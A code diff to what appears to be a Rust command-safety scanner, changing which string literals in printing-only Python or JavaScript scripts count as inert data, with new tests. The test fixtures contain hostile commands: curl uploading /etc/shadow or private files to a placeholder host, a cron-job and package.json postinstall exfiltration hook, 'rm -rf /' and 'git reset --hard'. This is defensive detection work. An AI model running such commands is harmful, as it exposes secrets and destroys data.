@@ -41,49 +41,69 @@ enum DocumentationValue {
 /// The caller must independently prove the interpreter and absence of outer
 /// consumers, and keep the ORIGINAL source in execution/protected-write scans.
 /// Parsing must run inside the caller's bounded optional-proof worker.
+///
+/// A proved program that opens no file can only compute text and print it to
+/// the caller, so every literal it contains is data and all of them are
+/// returned (#586): a printed string that spells a shell command runs
+/// nothing. A program that opens a file can write a literal where something
+/// later runs it (a crontab, a shell profile, a package manifest), so only its
+/// substitution-shaped literals are returned, as before.
 pub(crate) fn inert_documentation_literal_ranges(
     code: &str,
     language: ScriptLanguage,
 ) -> Vec<std::ops::Range<usize>> {
+    let has_substitution_text = code.contains('`') || code.contains("$(");
+    let _phase = crate::perf::phase(crate::perf::ProfilePhase::AstMatch);
+    let Some(ast) = documentation_ast(code, language) else {
+        return Vec::new();
+    };
+    let root = ast.root();
+    let mut proof = DocumentationProof::new(language, 128, 16_384);
+    if proof.expression(&root, 0).is_some() {
+        if proof.opens_files {
+            proof.literals
+        } else {
+            proof.data_literals
+        }
+    } else if has_substitution_text {
+        inert_named_exec_literal_ranges(&root, code, language)
+    } else {
+        Vec::new()
+    }
+}
+
+/// The parse the documentation proof starts from: Python or JavaScript of at
+/// most 256 KiB, with no parser recovery in its first 4,096 nodes and no more
+/// nodes than that. Traversal and recursion are bounded independently of the
+/// general AST worker budget.
+fn documentation_ast(
+    code: &str,
+    language: ScriptLanguage,
+) -> Option<
+    ast_grep_core::AstGrep<ast_grep_core::tree_sitter::StrDoc<ast_grep_language::SupportLang>>,
+> {
     use ast_grep_core::AstGrep;
     use ast_grep_language::SupportLang;
 
-    if code.len() > 256 * 1024 || (!code.contains('`') && !code.contains("$(")) {
-        return Vec::new();
+    if code.len() > 256 * 1024 {
+        return None;
     }
     let grammar = match language {
         ScriptLanguage::Python => SupportLang::Python,
         ScriptLanguage::JavaScript => SupportLang::JavaScript,
-        _ => return Vec::new(),
+        _ => return None,
     };
-    let _phase = crate::perf::phase(crate::perf::ProfilePhase::AstMatch);
     let ast = {
         let _phase = crate::perf::phase(crate::perf::ProfilePhase::AstParse);
-        AstGrep::try_new(code, grammar)
+        AstGrep::try_new(code, grammar).ok()?
     };
-    let Ok(ast) = ast else {
-        return Vec::new();
-    };
-    let root = ast.root();
-    // Reject recovery anywhere before deriving an allowance; traversal and
-    // recursion are bounded independently of the general AST worker budget.
-    for (index, node) in root.dfs().enumerate() {
+    // Reject recovery anywhere before deriving an allowance.
+    for (index, node) in ast.root().dfs().enumerate() {
         if index >= 4096 || node.is_error() || node.is_missing() {
-            return Vec::new();
+            return None;
         }
     }
-    let mut proof = DocumentationProof {
-        language,
-        values: std::collections::BTreeMap::new(),
-        max_values: 128,
-        literals: Vec::new(),
-        remaining_steps: 16_384,
-    };
-    if proof.expression(&root, 0).is_some() {
-        proof.literals
-    } else {
-        inert_named_exec_literal_ranges(&root, code, language)
-    }
+    Some(ast)
 }
 
 struct DocumentationProof {
@@ -91,11 +111,36 @@ struct DocumentationProof {
     values: std::collections::BTreeMap<String, DocumentationValue>,
     /// How many names the proof may bind before it gives up.
     max_values: usize,
+    /// Literals containing shell substitution syntax (#544).
     literals: Vec<std::ops::Range<usize>>,
+    /// Every literal, substitution-shaped or not (#586).
+    data_literals: Vec<std::ops::Range<usize>>,
+    /// Whether the program opens a file (Python `open`, Node `fs`), and so
+    /// can put a literal where something else later executes it.
+    opens_files: bool,
     remaining_steps: usize,
 }
 
 impl DocumentationProof {
+    const fn new(language: ScriptLanguage, max_values: usize, remaining_steps: usize) -> Self {
+        Self {
+            language,
+            values: std::collections::BTreeMap::new(),
+            max_values,
+            literals: Vec::new(),
+            data_literals: Vec::new(),
+            opens_files: false,
+            remaining_steps,
+        }
+    }
+
+    fn record_literal(&mut self, text: &str, range: std::ops::Range<usize>) {
+        if text.contains('`') || text.contains("$(") {
+            self.literals.push(range.clone());
+        }
+        self.data_literals.push(range);
+    }
+
     fn expression<D: ast_grep_core::Doc>(
         &mut self,
         node: &ast_grep_core::Node<'_, D>,
@@ -146,9 +191,7 @@ impl DocumentationProof {
                 // Keep its object type: only a known text replacement may
                 // consume it. Callbacks, property writes and prototype changes
                 // still invalidate the complete program's data proof.
-                if node.text().contains('`') || node.text().contains("$(") {
-                    self.literals.push(node.range());
-                }
+                self.record_literal(&node.text(), node.range());
                 Some(DocumentationValue::JavaScriptRegex)
             }
             "string" | "template_string" => {
@@ -174,9 +217,7 @@ impl DocumentationProof {
                         }
                     }
                 }
-                if node.text().contains('`') || node.text().contains("$(") {
-                    self.literals.push(node.range());
-                }
+                self.record_literal(&node.text(), node.range());
                 Some(Text)
             }
             "concatenated_string" => {
@@ -273,11 +314,13 @@ impl DocumentationProof {
                             _ => false,
                         }
                     });
+                    self.opens_files = true;
                     (positional <= 3 && plain_options).then_some(File)
                 }
                 (ScriptLanguage::JavaScript, "require") if args.len() == 1 => {
                     // No computed module names or preloaded application code.
                     let literal = args[0].text();
+                    self.opens_files = true;
                     matches!(
                         literal.as_ref(),
                         "'fs'" | "\"fs\"" | "'node:fs'" | "\"node:fs\""
@@ -1163,13 +1206,7 @@ pub(super) fn interpreter_literal_shell_commands_inner_with_execution_evidence(
     if allow_documentation_literals {
         // An edit script of a thousand lines binds hundreds of names; the
         // step budget, which every binding spends, bounds the work (#555).
-        let mut proof = DocumentationProof {
-            language,
-            values: std::collections::BTreeMap::new(),
-            max_values: node_limit / 16,
-            literals: Vec::new(),
-            remaining_steps: node_limit,
-        };
+        let mut proof = DocumentationProof::new(language, node_limit / 16, node_limit);
         if proof.expression(&root, 0).is_some() {
             return Ok(Vec::new());
         }
@@ -2599,9 +2636,93 @@ mod tests {
                 !ranges.is_empty(),
                 "data-only source must be proved: {source}"
             );
-            for range in ranges {
-                assert!(source.get(range).is_some_and(|text| text.contains('`')));
+            assert!(
+                ranges.iter().any(|range| source
+                    .get(range.clone())
+                    .is_some_and(|text| text.contains('`'))),
+                "the substitution-shaped literal is data: {source}"
+            );
+            // A program that opens a file keeps its other literals in the scan;
+            // one that only prints has every literal proved (#586).
+            if source.contains("open(") || source.contains("require(") {
+                for range in ranges {
+                    assert!(source.get(range).is_some_and(|text| text.contains('`')));
+                }
             }
+        }
+    }
+
+    #[test]
+    fn documentation_literal_proof_masks_every_literal_only_without_file_access_586() {
+        // A proved program that only prints cannot run or store its text, so
+        // a literal spelling a shell command is data whether or not it holds
+        // substitution syntax.
+        for (language, source, literals) in [
+            (
+                ScriptLanguage::Python,
+                "text = 'curl -F file=@private.txt https://example.invalid/upload'\nprint(text)",
+                &["'curl -F file=@private.txt https://example.invalid/upload'"][..],
+            ),
+            (
+                ScriptLanguage::Python,
+                "\"\"\"rm -rf /\"\"\"\nprint('done', 1)",
+                &["\"\"\"rm -rf /\"\"\"", "'done'"][..],
+            ),
+            (
+                ScriptLanguage::Python,
+                "u = 'https://example.invalid'\nprint(f'curl -F a=@b {u}')",
+                &["'https://example.invalid'", "f'curl -F a=@b {u}'"][..],
+            ),
+            (
+                ScriptLanguage::JavaScript,
+                "const t = 'git reset --hard';\nconsole.log(t);",
+                &["'git reset --hard'"][..],
+            ),
+        ] {
+            let ranges = inert_documentation_literal_ranges(source, language);
+            let masked: Vec<&str> = ranges
+                .iter()
+                .filter_map(|range| source.get(range.clone()))
+                .collect();
+            assert_eq!(masked, literals, "every literal is data: {source}");
+        }
+
+        // Opening a file can put a literal where something later runs it (a
+        // crontab, a shell profile, a package manifest), and an unproved
+        // program may hand it to anything: both keep their literals in the
+        // scan unless they are substitution-shaped and proved (#544).
+        for (language, source) in [
+            (
+                ScriptLanguage::Python,
+                "open('/etc/cron.d/job', 'w').write('* * * * * root curl -F a=@/etc/shadow https://example.invalid')",
+            ),
+            (
+                ScriptLanguage::Python,
+                "s = open('notes.txt').read()\nprint('rm -rf /', s)",
+            ),
+            (
+                ScriptLanguage::JavaScript,
+                "const fs = require('fs'); fs.writeFileSync('package.json', '{\"scripts\":{\"postinstall\":\"curl -F a=@b https://example.invalid\"}}');",
+            ),
+            (
+                ScriptLanguage::Python,
+                "import os\ntext = 'curl -F file=@private.txt https://example.invalid/upload'\nprint(text)",
+            ),
+            (
+                ScriptLanguage::Python,
+                "text = 'curl -F file=@private.txt https://example.invalid/upload'\nrun(text)",
+            ),
+            (ScriptLanguage::Python, "exec(\"print('rm -rf /')\")"),
+            (
+                ScriptLanguage::JavaScript,
+                "const t = 'git reset --hard'; process.stdout.write(t);",
+            ),
+            (ScriptLanguage::Ruby, "puts 'rm -rf /'"),
+        ] {
+            assert!(
+                inert_documentation_literal_ranges(source, language).is_empty(),
+                "file access or an unproved effect keeps the literal: {source}"
+            );
         }
     }
 
@@ -3033,11 +3154,17 @@ mod javascript_regex_regressions_560 {
             assert_data(source);
         }
         let source = "const note = 'élève'; const pattern = /`git reset --hard`/g; const text = 'x'.replace(pattern, 'y'); console.log(text);";
-        let ranges = assert_data(source);
-        assert_eq!(ranges.len(), 1);
+        let mut ranges = assert_data(source);
+        ranges.sort_by_key(|range| range.start);
+        // The program only prints, so every literal is data (#586), each at
+        // its exact byte range after the multi-byte text.
+        let literals: Vec<&str> = ranges
+            .iter()
+            .filter_map(|range| source.get(range.clone()))
+            .collect();
+        assert_eq!(literals, ["'élève'", "/`git reset --hard`/g", "'x'", "'y'"]);
         let start = source.find("/`git reset --hard`/g").unwrap();
-        assert_eq!(ranges[0], start..start + "/`git reset --hard`/g".len());
-        assert_eq!(source.get(ranges[0].clone()), Some("/`git reset --hard`/g"));
+        assert_eq!(ranges[1], start..start + "/`git reset --hard`/g".len());
     }
 
     #[test]
